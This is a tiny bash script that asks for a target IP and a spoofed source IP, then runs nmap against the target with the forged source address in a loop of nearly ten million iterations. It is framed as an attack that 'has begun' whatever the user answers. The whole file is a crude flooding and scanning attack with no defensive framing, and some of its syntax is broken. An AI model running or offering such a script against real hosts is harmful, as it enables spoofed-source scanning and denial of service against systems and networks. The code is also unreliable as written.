# LINUX and his children only

echo Please install nmap (.org)

echo Target IP ?
read target_ip

echo non-existant-IP ?
read non_existant_ip

echo Are you Ready ? No matter your answer, it has begun

# x2 Power
for ((i=0;i<9999999;i++)) do nmap -S $non_existant_ip $target_ip done
